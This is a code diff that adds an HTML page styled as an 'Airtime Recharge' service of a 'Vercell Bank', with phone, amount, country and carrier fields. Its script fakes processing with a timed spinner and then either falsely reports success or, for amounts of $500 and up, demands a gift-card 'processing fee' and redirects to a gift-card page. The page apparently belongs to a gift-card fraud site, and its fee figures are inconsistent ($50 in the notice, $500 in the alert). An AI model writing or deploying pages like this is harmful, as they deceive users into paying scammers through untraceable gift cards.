@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Airtime Recharge - Vercell Bank</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      padding: 20px;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #0f172a;
+      color: #f8fafc;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: auto;
+      background-color: #1e293b;
+      padding: 25px;
+      border-radius: 10px;
+      border: 1px solid #334155;
+    }
+
+    h2 {
+      text-align: center;
+      color: #3b82f6;
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      margin-bottom: 15px;
+      background-color: #0f172a;
+      color: #f8fafc;
+      border: 1px solid #334155;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #3b82f6;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      color: white;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      background-color: #2563eb;
+    }
+
+    .note {
+      font-size: 0.85rem;
+      color: #94a3b8;
+      margin-top: 10px;
+      text-align: center;
+    }
+
+    .spinner {
+      width: 40px;
+      height: 40px;
+      border: 4px solid #22c55e;
+      border-top: 4px solid transparent;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    #spinnerBox {
+      display: none;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h2>📱 Airtime Recharge</h2>
+
+    <div id="spinnerBox">
+      <div class="spinner"></div>
+      <p style="color:#22c55e; font-weight:bold;">⭘ Processing your top-up...</p>
+    </div>
+
+    <form id="airtimeForm" onsubmit="return handleAirtime(event)">
+      <label>Phone Number</label>
+      <input type="tel" id="phone" required placeholder="+1 234 567 8901" />
+
+      <label>Amount ($)</label>
+      <input type="number" id="amount" required placeholder="Enter amount" />
+
+      <label>Country</label>
+      <select required>
+        <option value="">Select Country</option>
+        <option>United States</option>
+        <option>United Kingdom</option>
+        <option>Canada</option>
+        <option>Australia</option>
+        <option>Germany</option>
+      </select>
+
+      <label>Network Provider</label>
+      <select required>
+        <option value="">Choose Network</option>
+        <option>AT&T</option>
+        <option>T-Mobile</option>
+        <option>Verizon</option>
+        <option>Vodafone</option>
+        <option>EE</option>
+        <option>Telstra</option>
+        <option>O2</option>
+      </select>
+
+      <button type="submit">Top Up Now</button>
+    </form>
+
+    <p class="note">⚠️ Recharges above $500 require $50 Gift Card verification.</p>
+  </div>
+
+  <script>
+    function handleAirtime(e) {
+      e.preventDefault();
+
+      const amount = parseFloat(document.getElementById("amount").value);
+      const spinner = document.getElementById("spinnerBox");
+
+      spinner.style.display = "block";
+
+      setTimeout(() => {
+        spinner.style.display = "none";
+
+        if (amount >= 500) {
+          alert("⚠️ A $500 Gift Card processing fee is required for top-ups above $500.\nRedirecting to verification...");
+          window.location.href = "giftcard.html";
+        } else {
+          alert("✅ Airtime top-up successful!");
+          window.location.href = "dashboard.html";
+        }
+      }, 5000);
+
+      return false;
+    }
+  </script>
+
+</body>
+</html>
